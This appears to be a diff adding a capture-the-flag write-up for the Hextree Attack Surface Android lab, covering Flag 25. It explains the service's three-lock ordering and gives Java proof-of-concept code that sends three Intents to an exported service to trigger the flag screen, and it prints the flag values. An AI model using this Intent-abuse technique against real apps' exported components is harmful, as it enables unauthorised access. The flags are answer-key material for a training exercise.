@@ -2219,3 +2219,75 @@ HXT{basic-service-ha98sl}
 ```
 
 **Flag:** `HXT{basic-service-ha98sl}`
+
+# Flag 25 — Service Lifecycle
+
+I started by inspecting `Flag25Service` in **JADX**. Unlike Flag 24, this service had three different actions:
+
+```text
+io.hextree.services.UNLOCK1
+io.hextree.services.UNLOCK2
+io.hextree.services.UNLOCK3
+```
+
+The service keeps track of three boolean variables:
+
+```java
+boolean lock1 = false;
+boolean lock2 = false;
+boolean lock3 = false;
+```
+
+Looking at `onStartCommand()`, I found that the actions have to be sent in the correct order. `UNLOCK1` sets `lock1` to `true`, then `UNLOCK2` checks `lock1` before setting `lock2`, and finally `UNLOCK3` checks `lock2` before setting `lock3`.
+
+Once all three locks are enabled, the service calls `success()` and opens `Flag25Activity`.
+
+I used my PoC app to send the three Intents one after another:
+
+```java
+btn.setOnClickListener(v -> {
+
+    try {
+        Intent intent1 = new Intent();
+        intent1.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag25Service"
+        ));
+        intent1.setAction("io.hextree.services.UNLOCK1");
+        startService(intent1);
+
+        Intent intent2 = new Intent();
+        intent2.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag25Service"
+        ));
+        intent2.setAction("io.hextree.services.UNLOCK2");
+        startService(intent2);
+
+        Intent intent3 = new Intent();
+        intent3.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag25Service"
+        ));
+        intent3.setAction("io.hextree.services.UNLOCK3");
+        startService(intent3);
+
+        Toast.makeText(
+                this,
+                "started service",
+                Toast.LENGTH_SHORT
+        ).show();
+
+    } catch (Exception e) {
+        Log.e("FLAG24", "Service start failed", e);
+    }
+});
+```
+
+After pressing the button, I opened the **Hextree Attack Surface** app and the Flag 25 screen appeared with the flag.
+
+```text
+HXT{only-one-running-service-1hasu}
+```
+
+**Flag:** `HXT{only-one-running-service-1hasu}`
